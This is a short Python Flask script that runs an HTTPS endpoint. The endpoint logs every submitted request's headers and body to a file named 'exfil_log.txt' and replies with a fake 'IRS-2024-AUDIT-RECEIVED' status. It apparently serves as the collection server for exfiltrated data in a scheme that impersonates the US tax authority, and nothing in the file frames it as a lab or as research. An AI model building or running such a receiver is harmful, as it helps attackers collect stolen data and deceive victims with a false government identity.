from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
LOG_FILE = "exfil_log.txt"

@app.route('/submit', methods=['POST'])
def capture_data():
    timestamp = datetime.datetime.now().isoformat()
    client_header = request.headers.get('X-Audit-Client', 'UNKNOWN')
    data = request.json.get('encrypted_data', '') if request.json else ''
    
    log_entry = f"""
=== NEW SUBMISSION {timestamp} ===
Client: {client_header}
Headers:
{request.headers}
Body:
{request.data.decode()}
{"-"*40}
"""
    
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)
    
    print(f"Captured data from {client_header}")
    return jsonify({"status": "IRS-2024-AUDIT-RECEIVED"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc')  # HTTPS required
